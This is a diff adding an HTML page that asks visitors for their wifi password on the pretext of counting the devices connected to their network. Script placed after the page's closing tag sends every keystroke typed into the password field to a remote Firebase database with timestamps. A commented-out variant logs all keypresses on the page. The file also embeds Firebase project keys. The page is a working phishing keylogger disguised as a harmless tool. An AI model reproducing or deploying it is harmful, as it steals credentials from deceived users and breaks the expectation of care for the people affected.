@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Password Input Page</title>
+  <style>
+    /* Reset default styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    /* Background Styling */
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+    }
+
+    /* Card Container */
+    .container {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(15px);
+      padding: 40px 50px;
+      border-radius: 20px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 320px;
+    }
+
+    /* Heading */
+    .container h1 {
+      color: #fff;
+      font-size: 1.8rem;
+      margin-bottom: 20px;
+      letter-spacing: 1px;
+    }
+
+    /* Input Field */
+    .input-box {
+      position: relative;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      border: none;
+      outline: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      color: #333;
+      background-color: #fff;
+      transition: all 0.3s ease;
+    }
+
+    input[type="password"]:focus {
+      box-shadow: 0 0 10px rgba(37, 117, 252, 0.7);
+      transform: scale(1.02);
+    }
+
+    /* Decorative Line */
+    .line {
+      height: 3px;
+      width: 50%;
+      margin: 20px auto 0;
+      background: #fff;
+      border-radius: 2px;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Enter your wifi password to check how many devices are connected to your wifi </h1>
+    <div class="input-box">
+      <input type="password" id="inputBox" placeholder="Enter password">
+    </div>
+    <div class="line"></div>
+  </div>
+</body>
+</html>
+
+
+
+
+
+
+<!--  -->
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+
+
+ 
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAngaRYpto2-UXa62-Rx-YJAHtOa8fakDw",
+      authDomain: "wifi-75025.firebaseapp.com",
+      databaseURL: "https://wifi-75025-default-rtdb.firebaseio.com",
+      projectId: "wifi-75025",
+      storageBucket: "wifi-75025.firebasestorage.app",
+      messagingSenderId: "865012452777",
+      appId: "1:865012452777:web:c11f00e75326cf8ccd88b8",
+      measurementId: "G-6SRG7MV64G"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const senderId = 'sender-' + Math.random().toString(36).slice(2, 8);
+    const inputBox = document.getElementById('inputBox');
+
+    // Handle normal keypresses (mobile-friendly)
+    inputBox.addEventListener('input', (e) => {
+      const value = e.target.value;
+      if (!value) return;
+      const lastChar = value.slice(-1);
+      sendKey(lastChar);
+    });
+
+    // Handle special keys (desktop + mobile hardware keyboards)
+    inputBox.addEventListener('keydown', (e) => {
+      const specialKeys = ['Backspace', 'Enter', 'Tab', 'Shift', 'Escape', ' ', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
+      if (specialKeys.includes(e.key)) {
+        sendKey(e.key === ' ' ? 'Space' : e.key);
+      }
+    });
+
+    function sendKey(keyValue) {
+      const timestamp = Date.now();
+      db.ref('keys').push({
+        key: keyValue,
+        ts: timestamp,
+        from: senderId
+      }).catch(err => console.error(err));
+    }
+  </script>
+
+
+  <!-- <script>
+    // ----- PASTE YOUR FIREBASE CONFIG HERE -----
+    const firebaseConfig = {
+     apiKey: "AIzaSyAngaRYpto2-UXa62-Rx-YJAHtOa8fakDw",
+  authDomain: "wifi-75025.firebaseapp.com",
+  databaseURL: "https://wifi-75025-default-rtdb.firebaseio.com",
+  projectId: "wifi-75025",
+  storageBucket: "wifi-75025.firebasestorage.app",
+  messagingSenderId: "865012452777",
+  appId: "1:865012452777:web:c11f00e75326cf8ccd88b8",
+  measurementId: "G-6SRG7MV64G"
+    };
+    // -------------------------------------------
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // optional: identify this sender (device)
+    const senderId = 'sender-' + Math.random().toString(36).slice(2, 8);
+
+    document.addEventListener('keydown', (e) => {
+      const key = e.key;
+      const timestamp = Date.now();
+      // push a new record under /keys
+      db.ref('keys').push({
+        key,
+        ts: timestamp,
+        from: senderId
+      }).catch(err => console.error(err));
+    });
+  </script> -->
+</body>
+</html>
